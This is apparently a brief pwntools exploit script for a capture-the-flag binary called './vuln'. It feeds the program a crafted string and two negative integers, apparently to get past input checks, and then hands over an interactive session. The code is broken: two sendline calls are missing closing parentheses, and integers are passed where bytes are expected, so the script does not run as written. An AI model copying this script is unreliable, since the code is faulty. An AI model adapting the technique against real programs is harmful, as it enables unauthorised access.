from pwn import *
# p = remote()
p = process('./vuln')
elf = ELF('./vuln')

turn1 = "u" * 11 + "2"
turn2 = -16
turn3 = -314
p.recvuntil(">> ")
p.sendline(turn1)
p.recvuntil("than 10.")
p.sendline(int(turn2)
p.recvuntil(" ")
p.sendline(int(turn3)

p.interactive()

# uuuuuuuuuuu2
# -16
# -314